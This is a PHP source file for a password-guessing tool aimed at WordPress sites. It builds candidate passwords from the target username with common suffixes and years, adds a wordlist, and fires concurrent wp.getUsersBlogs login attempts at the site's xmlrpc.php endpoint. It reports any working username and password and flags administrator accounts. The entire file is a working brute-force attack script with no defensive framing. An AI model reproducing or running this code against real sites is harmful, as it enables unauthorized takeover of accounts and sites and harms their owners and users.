<?php
include 'init.php';
define("user", $argv[2]);
class BruteWordPress
{
    private $rc;
    function __construct() {
        $this->rc = new RollingCurl();
        $this->rc->callback = $this->create_request_callback($this->rc);
        $this->rc->__set('window_size', Thread);
        $this->rc->__set('time_out', TimeOut);
    }
    
    function create_request_callback($rc) {
        return function ($response, $info, $request) use ($rc) {
            if ($info['http_code'] == 404 || $info['http_code'] == 403 || $info['http_code'] == 500) {
                echo '[-] Access error!' . PHP_EOL;
                $this->rc->cancelRequests();
            }
            
            $p = $request->post_data;
            preg_match_all('/<param><value>([^\s]+?)<\/value><\/param>/', $p, $m);
            $user = $m[1][0];
            $pass = $m[1][1];
            if (!preg_match('/<boolean>(\d)<\/boolean>/', $response, $is_admin)) {
                
                //echo '[*] Brote user ' . $user . " ..." . "\r";
                
                
            } else {
                
                //print_r($is_admin).PHP_EOL;
                if ($is_admin[1] == 1) {
                    echo '[+] Bruteed~ -> ' . iconv("UTF-8","GB18030//IGNORE",$user)  . ':' . $pass . ' [is admin]' . PHP_EOL;
                    $this->rc->cancelRequests();
                } else {
                    echo '[+] Bruteed~ -> ' . iconv("UTF-8","GB18030//IGNORE",$user)  . ':' . $pass . PHP_EOL;
                    $this->rc->cancelRequests();
                }
            }
        };
    }
    
    function run() {
        $pass_file = preg_replace('/\s$/', "", file(wordlist));
        $user_pre = array('123', '111', '1', 'a', 'pass', '!@#', 'password', 'abc', '1961', '1962', '1963', '1970', '1988', '1989', '1990', '1991', '1992', '1993', '1994', '1995', '1996', '1997', '1998', '1999', '2001', '2002', '2003', '2004', '2006', '2005', '2007', '2008', '2009', '2010', '2011', '2012', '2013', '2014', '2015');
        foreach ($user_pre as $pre) {
            $pre_u[] = user . $pre;
        }
        $p = array_merge($pre_u, $pass_file);
        $passwords = array_unique($p);
        array_unshift($passwords, user);
        
        foreach ($passwords as $pass) {
            $url = domain . '/xmlrpc.php';
            $post_data = sprintf('<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>', user, $pass);
            $request = new RollingCurlRequest($url, 'POST', $post_data);
            $request->options = array(CURLOPT_USERAGENT => USERAGENT);
            $this->rc->add($request);
        }
        $this->rc->execute();
    }
}

$brute = new BruteWordPress();
$brute->run();
?>